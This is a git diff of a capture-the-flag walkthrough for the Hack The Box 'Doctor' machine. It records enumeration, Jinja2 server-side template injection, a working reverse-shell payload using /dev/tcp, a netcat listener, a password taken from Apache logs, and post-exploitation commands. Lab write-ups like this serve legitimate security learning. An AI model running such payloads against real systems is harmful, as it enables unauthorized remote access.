@@ -38,11 +38,15 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 + Visiting doctors.htb sends us to another page
 ![image](https://github.com/brownPineapple/hackthebox/assets/30342446/cde2e474-48ac-406a-aa38-107b86c7b564)
 + We can register and it creates an account for 20 minutes
-+ Checking the source and see something strange - _<!--archive still under beta testing<a class="nav-item nav-link" href="/archive">Archive</a>-->_
-+ We can create posts on this website and it shows us the posts on the homepage
++ Checking the source and see something strange -
+```bash
+<!--archive still under beta testing<a class="nav-item nav-link" href="/archive">Archive</a>-->
+```
++ This looks like a blog post website, we can create posts on this website.
 + Checking /archive directory but nothing interesting
-+ Checking the source of /archive and found something interesting, it has xml output of the posts that we create
-+ TRYING SSTI hacktricks injection ```{{ 7*7 }}``` and we get 49 on the archive source ```view-source:http://doctors.htb/archive```
++ Checking the source of /archive and found something interesting, it has xml output of the posts that we create. Checking for XXE and SSTI vulnerabilities.
++ TRYING SSTI hacktricks injection ```{{ 7*7 }}```, no success on the blog page
++ But we get 49 on the archive source ```view-source:http://doctors.htb/archive```
 
 ![image](https://github.com/brownPineapple/hackthebox/assets/30342446/58379fa5-5355-4014-aec1-113cebd7ae90)
 
@@ -52,9 +56,9 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 ### Initial Foothold
 
-+ Checking for reverse shell payloads on PayloadAllTheThings SSTI -
++ Checking for reverse shell payloads on PayloadAllTheThings SSTI - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2
 + The one that worked was - ```{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("bash -c 'bash -i >& /dev/tcp/<ip>/4444 0>&1'").read()}}{%endif%}{%endfor%}```
-+ Starting netcat listener - ```nc -lvnp 4444``` and getting reverse shell as web@doctor
++ Starting netcat listener, refreshing the /archive direcroty - ```nc -lvnp 4444``` and getting reverse shell as web@doctor
 ![image](https://github.com/brownPineapple/hackthebox/assets/30342446/2e42813a-dcba-415b-bdbf-b15d7951a808)
 + ```/home``` directory has another user shaun with user.txt file
 + We are part of the admin group, we can check audit logs for passwords
@@ -80,7 +84,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 /var/log/apache2/backup:10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] "POST /reset_password?email=Guitar123" 500 453 "http://doctor.htb/reset_password"
 ```
 + Trying the password for shaun user
-+ BOOM, we are user
++ **BOOM**, we are user
 
 ![image](https://github.com/brownPineapple/hackthebox/assets/30342446/6dc8a106-f03d-4179-8165-504fc8b7999d)
 
@@ -100,3 +104,14 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ![image](https://github.com/brownPineapple/hackthebox/assets/30342446/0acf874a-a1e3-44cc-9bd3-ce4591808089)
 ![image](https://github.com/brownPineapple/hackthebox/assets/30342446/16999956-7a6a-4598-aa27-a1655be541cd)
 + PWNED !!!
+
+## Highlights
+
+1. **Enumeration** - Nmap scan - We did an initial nmap scan and discovered a lot of things, port 22 SSH, the banner tells us we are running an Ubuntu server, http website which led us to code execution via the SSTI injection, Splunk port 8089 which gave us root access to the machine.
+2. **Preparation** - Github repos and EXPLOIT-DB - finding reverse shell payloads, finding POCs of exploits from CVE IDs, finding injecton payloads.
+3. **Exploitation** - Running the exploits, Ensuring that all the dependencies are installed for the exploits to run.
+>one thing I did not mention was for running the final exploit to get root, I did not have my python set up properly so I could not run
+```pip3 -r requirements.txt```
+>I had to create a virtual environment and then install the requirements, which was successful, read more here - https://docs.python.org/3/library/venv.html
+![image](https://github.com/brownPineapple/hackthebox/assets/30342446/f47527d0-5b11-460b-a75a-02e05109df58)
+4. **Post Exploitation** - Running Linpeas.sh (from the PEASS suite - https://github.com/peass-ng/PEASS-ng/tree/master), searching for passwords in files - ```grep -R -e 'password' <dir>```, checking running processes - ```ps -ef ```
